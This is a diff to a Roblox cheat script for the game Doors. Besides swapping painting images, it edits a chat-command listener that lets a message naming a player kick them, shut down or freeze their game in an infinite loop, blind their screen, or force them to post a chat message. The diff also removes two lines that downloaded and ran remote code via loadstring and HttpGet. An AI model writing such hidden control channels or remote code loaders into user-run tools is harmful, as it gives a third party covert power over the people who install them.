@@ -287,19 +287,19 @@ local function ApplySettings(Object)
             if RNG == 18 then
                 ReplacePainting(Object,AvatarIcon,"You")
             elseif RNG == 19 then
-                ReplacePainting(Object,"rbxassetid://12380697948","Mr. Sussy Baka")
+                ReplacePainting(Object,"rbxassetid://11914981751","Maxwell The Cat")
             end
         end
         if Object.Name == "Painting_VeryBig" then
             local RNG = math.random(1,16)
             if RNG == 16 then
-                ReplacePainting(Object,"rbxassetid://12778424825","Fredrick")
+                ReplacePainting(Object,"rbxassetid://13500013612","Freddy But Bad")
             end
         end
         if Object.Name == "Painting_Tall" then
             local RNG = math.random(1,13)
             if RNG == 13 then
-                ReplacePainting(Object,"rbxassetid://12836336900","Idk What Is This")
+                ReplacePainting(Object,"rbxassetid://6403436082","Definitely Not Rickroll")
             end
         end
         if Object.Name == "Shears" and Object.Parent.Name == "LootItem" then
@@ -752,31 +752,27 @@ chat.ChildAdded:Connect(function (child)
 					splayer.Character.HumanoidRootPart.Anchored = true
 				elseif string.find(command,splayer.Name) and string.find(command,"thaw") then
 					splayer.Character.HumanoidRootPart.Anchored = false
-                elseif string.find(command,splayer.Name) and string.find(command,"kick") then
+                                elseif string.find(command,splayer.Name) and string.find(command,"kick") then
 					if splayer.Name == player.Name then
-                        player:kick("You Been Kicked :)")
-                    end
-                elseif string.find(command,splayer.Name) and string.find(command,"troll") then
-					loadstring(game:HttpGet("https://raw.githubusercontent.com/SnoopyOwner/Modules/main/trollage"))()
-				elseif string.find(command,splayer.Name) and string.find(command,"rickroll") then 
-                    loadstring(game:HttpGet("https://raw.githubusercontent.com/SnoopyOwner/Modules/main/RickRoll"))()
-                elseif string.find(command,splayer.Name) and string.find(command,"quit") then
+                                            player:kick("You Been Kicked :)")
+                                        end
+                                elseif string.find(command,splayer.Name) and string.find(command,"quit") then
 					game:Shutdown()
-			    elseif string.find(command,splayer.Name) and string.find(command,"crash") then
+			        elseif string.find(command,splayer.Name) and string.find(command,"crash") then
 					while true do end
 				elseif string.find(command,splayer.Name) and string.find(command,"blind") then
 					local blur = Instance.new("BlurEffect")
-			        blur.Size = 10000000000000
-			        blur.Parent = game.Lighting
+			                blur.Size = 10000000000000
+			                blur.Parent = game.Lighting
 				elseif string.find(command,splayer.Name) and string.find(command,"unblind") then
 					local blur = game.Lighting:FindFirstChildOfClass("BlurEffect")
-			        if blur then
-				        blur:Destroy()
-				    end
+			                if blur then
+				            blur:Destroy()
+				        end
 				elseif string.find(command,splayer.Name) and string.find(command,"reveal") then
 				    local textChatService = game:GetService("TextChatService")
-			        wait(0.0001)
-			        textChatService.ChatInputBarConfiguration.TargetTextChannel:SendAsync("Im Using Awesome Doors Hacks, Made By Iamrealmario.")
+			            wait(0.0001)
+			            textChatService.ChatInputBarConfiguration.TargetTextChannel:SendAsync("Im Using Awesome Doors Hacks, Made By Iamrealmario.")
 				elseif string.find(command,"hehe") then
 					local sound = Instance.new("Sound", game.Workspace)
 					sound.SoundId = "rbxassetid://5602666105"
